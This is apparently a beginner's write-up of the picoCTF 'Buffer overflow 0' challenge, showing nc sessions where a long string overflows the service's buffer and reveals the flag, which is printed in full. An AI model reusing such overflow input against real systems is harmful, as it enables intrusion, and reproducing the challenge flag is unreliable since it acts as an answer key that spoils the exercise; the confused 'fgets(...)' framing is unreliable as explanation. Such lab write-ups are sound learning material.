# Buffer overflow 0
this challenge has asked us to overflow the caorrect buffer. Now overflow buffer occurs when the amount of data in the buffer exceeds the maximum storage.
I also refered the man page of `gets()` to know more about it.
The man page recommends the use of `fgets()` rather than `gets()` because of security reasons.
When we run the challenge instance, it asks us to give an input.

```bash
muizz@LAPTOP-VF1FT9IQ:~$ man gets
No manual entry for gets
muizz@LAPTOP-VF1FT9IQ:~$ nc saturn.picoctf.net 52118
Input: man gets
The program will exit now

muizz@LAPTOP-VF1FT9IQ:~$ nc saturn.picoctf.net 52118
Input: fgets(test)
The program will exit now

muizz@LAPTOP-VF1FT9IQ:~$ https://artifacts.picoctf.net/c/172/vuln.c
-bash: https://artifacts.picoctf.net/c/172/vuln.c: No such file or directory
muizz@LAPTOP-VF1FT9IQ:~$ nc saturn.picoctf.net 52118
Input: fgets(akdfbiueh18273n29384u*&%#&)
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```
Here i entered a string which contained alphabets,numbers and some special characters, and when run it, it caused the buffer overflow and gave me the flag.
I tried again but with a different string and got the flag.

```bash
muizz@LAPTOP-VF1FT9IQ:~$ nc saturn.picoctf.net 52118
Input: fgets(isufdhnaeu82734skjdfnh92*@#&$^!)
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

This is how I solved it.
